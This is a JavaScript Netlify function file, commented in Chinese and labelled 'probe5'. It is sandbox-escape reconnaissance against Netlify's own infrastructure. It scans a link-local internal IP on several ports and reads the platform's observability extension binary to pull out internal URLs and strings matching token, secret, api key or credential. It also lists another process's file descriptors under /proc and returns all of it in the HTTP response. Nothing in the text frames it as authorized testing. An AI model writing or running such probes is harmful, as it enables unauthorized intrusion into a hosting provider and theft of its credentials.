// Netlify probe5: extension 二进制 strings 分析 + 4310 端口探测 + fd socket 目标
const fs = require('fs');

const fetchT = async (url, opts = {}, ms = 4000) => {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), ms);
  try {
    const r = await fetch(url, { ...opts, signal: ac.signal, redirect: 'manual' });
    const b = await r.text();
    return r.status + ' ' + b.slice(0, 400).replace(/\n/g, '\\n');
  } catch (e) {
    return 'ERR ' + String(e).slice(0, 100);
  } finally { clearTimeout(t); }
};

exports.handler = async () => {
  const out = {};
  // 1. 4310 端口探测(extension 本地监听)
  const base = 'http://169.254.100.6:4310';
  out.port4310 = [];
  for (const p of ['/', '/v1/traces', '/v1/metrics', '/v1/logs', '/health', '/healthcheck', '/debug', '/status', '/metrics']) {
    out.port4310.push(p + ' => ' + await fetchT(base + p, {}, 2500));
  }
  // 2. strings 二进制找端点
  const BIN = '/opt/extensions/netlify-observability-extension';
  try {
    const buf = fs.readFileSync(BIN);
    out.binSize = buf.length;
    const s = buf.toString('latin1');
    // 提取 URL
    const urls = [];
    const re = /https?:\/\/[A-Za-z0-9._\-~:\/]+/g;
    let m;
    while ((m = re.exec(s)) && urls.length < 40) {
      const u = m[0];
      if (!urls.includes(u) && u.length < 200) urls.push(u);
    }
    out.urls = urls;
    // 提取 netlify 相关域名/路径
    const doms = [];
    const re2 = /[A-Za-z0-9\-]+\.netlify\.[a-z]+[A-Za-z0-9._\-~:\/]*/g;
    while ((m = re2.exec(s)) && doms.length < 30) {
      const u = m[0];
      if (!doms.includes(u) && u.length < 200) doms.push(u);
    }
    out.netlifyRefs = doms;
    // 提取有趣字符串:token/secret/api-key/collector/otlp
    const kws = [];
    const re3 = /(collector|otlp|endpoint|api[_-]?key|token|secret|credential)[A-Za-z0-9_\-\.:="']{0,120}/gi;
    while ((m = re3.exec(s)) && kws.length < 40) {
      const u = m[0];
      if (!kws.includes(u) && u.length < 150 && !/^\s*$/.test(u)) kws.push(u);
    }
    out.keywords = kws;
  } catch (e) {
    out.binErr = String(e);
  }
  // 3. 4318/4317 尝试(otel 标准端口在沙箱 IP 上)
  for (const port of [4317, 4318, 8080, 8000, 9090]) {
    out['p' + port] = await fetchT('http://169.254.100.6:' + port + '/', {}, 1500);
  }
  // 4. 看 extension 的 fd 类型
  try {
    const fds = fs.readdirSync('/proc/2/fd');
    const parts = [];
    for (const f of fds.slice(0, 40)) {
      try { parts.push(f + '->' + fs.readlinkSync('/proc/2/fd/' + f)); }
      catch (e) { parts.push(f + ' ERR'); }
    }
    out.proc2fdLinks = parts;
  } catch (e) { out.fdErr = String(e); }
  return { statusCode: 200, body: JSON.stringify(out) };
};
